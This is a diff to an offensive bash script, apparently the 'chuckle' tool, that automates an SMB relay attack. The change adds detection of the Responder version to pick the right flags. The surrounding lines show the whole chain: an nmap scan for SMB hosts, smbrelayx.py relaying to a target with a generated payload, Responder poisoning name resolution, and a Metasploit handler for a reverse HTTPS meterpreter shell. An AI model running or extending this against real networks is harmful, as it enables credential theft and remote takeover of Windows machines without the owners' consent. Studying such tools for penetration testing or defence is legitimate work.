@@ -25,6 +25,14 @@ echo -e '\n'
 # print nbt name, slow on big networks
 # valid values: 0 1
 shownbt=1
+#determine wish version of Repsonder is being used.
+if responder --version|grep 2.1>/dev/null; then
+        newresver=0
+	echo "Using Responder 2.1.*"
+else
+	newresver=1
+	echo "Using Responder >=2.2"
+fi
 
 busy=0
 for port in 21/tcp 25/tcp 53/tcp 80/tcp 88/tcp 110/tcp 139/tcp 143/tcp 1433/tcp 443/tcp 587/tcp 389/tcp 445/tcp 3141/tcp 53/udp 88/udp 137/udp 138/udp 5353/udp 5355/udp; do
@@ -43,7 +51,7 @@ read network
 nmap -n -Pn -sS --script smb-security-mode.nse -p445 -oA chuckle $network  >>chuckle.log &
 echo "Scanning for SMB hosts..."
 if [ $shownbt -gt 0 ]; then
-  echo "also resolving NBT name, could be quite slow"
+  echo "...also resolving NBT name, could be quite slow"
 fi
 wait
 echo > ./chuckle.hosts
@@ -88,11 +96,14 @@ echo "Payload created: $payload"
 echo "Starting SMBRelayX..."
 smbrelayx.py -h $target -e $payload  >> ./chuckle.log  &
 sleep 2
-echo "Stating Responder..."
-#Old responder
-responder -i $lhost -wrfF >>chuckle.log &
-#Fix for new responder options.
-#responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}') -wrfF >>chuckle.log &
+echo "Starting Responder..."
+if [ $newresver -gt 0 ]; then
+	#New Responder
+	responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}') -wrfF >>chuckle.log &	
+else
+	#Old Responder.
+	responder -i $lhost -wrfF >>chuckle.log &
+fi
 echo "Setting up listener..."
 echo "use exploit/multi/handler" > chuckle.rc
 echo "set payload windows/meterpreter/reverse_https" >> chuckle.rc
